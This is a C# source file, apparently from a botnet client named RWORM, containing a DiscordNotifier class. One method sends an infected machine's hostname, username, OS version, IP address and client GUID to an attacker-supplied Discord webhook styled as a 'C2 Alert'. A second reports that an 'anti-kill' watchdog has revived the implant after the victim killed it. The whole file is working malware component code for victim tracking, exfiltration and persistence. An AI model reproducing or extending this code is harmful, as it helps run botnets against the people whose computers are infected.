using System;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    public static class DiscordNotifier
    {
        private static readonly HttpClient Http = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };

        public static async Task SendConnectAlertAsync(
            string webhookUrl,
            string hostname,
            string username,
            string os,
            string ip,
            string guid)
        {
            if (string.IsNullOrWhiteSpace(webhookUrl) || !webhookUrl.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                var payload = new
                {
                    username = "RWORM C2 Alert",
                    avatar_url = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png",
                    embeds = new[]
                    {
                        new
                        {
                            title = "🟢 Client Connected Online",
                            description = $"**Host:** `{hostname}`\n**User:** `{username}`",
                            color = 0x2ECC71, // Green
                            fields = new[]
                            {
                                new { name = "IP Address", value = string.IsNullOrWhiteSpace(ip) ? "Unknown" : ip, inline = true },
                                new { name = "OS Version", value = os, inline = true },
                                new { name = "Client GUID", value = $"`{guid}`", inline = false }
                            },
                            footer = new { text = "RWORM Botnet • Connection Alert" },
                            timestamp = DateTime.UtcNow.ToString("o")
                        }
                    }
                };

                var json = JsonSerializer.Serialize(payload);
                using var content = new StringContent(json, Encoding.UTF8, "application/json");
                await Http.PostAsync(webhookUrl, content).ConfigureAwait(false);
            }
            catch
            {
                // Non-blocking fail-safe
            }
        }

        public static async Task SendReviveAlertAsync(string webhookUrl, string targetExe)
        {
            if (string.IsNullOrWhiteSpace(webhookUrl) || !webhookUrl.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                var payload = new
                {
                    username = "RWORM Watchdog",
                    avatar_url = "https://raw.githubusercontent.com/exsarorrayzer/rworm/main/assets/logo.png",
                    embeds = new[]
                    {
                        new
                        {
                            title = "🛡️ Anti-Kill Watchdog Alert",
                            description = $"⚠️ **Target process was killed!**\nBackup watchdog successfully revived: `{targetExe}`",
                            color = 0xE74C3C, // Red
                            fields = new[]
                            {
                                new { name = "Host", value = Environment.MachineName, inline = true },
                                new { name = "User", value = Environment.UserName, inline = true }
                            },
                            footer = new { text = "RWORM Guardian System" },
                            timestamp = DateTime.UtcNow.ToString("o")
                        }
                    }
                };

                var json = JsonSerializer.Serialize(payload);
                using var content = new StringContent(json, Encoding.UTF8, "application/json");
                await Http.PostAsync(webhookUrl, content).ConfigureAwait(false);
            }
            catch
            {
                // Non-blocking fail-safe
            }
        }
    }
}
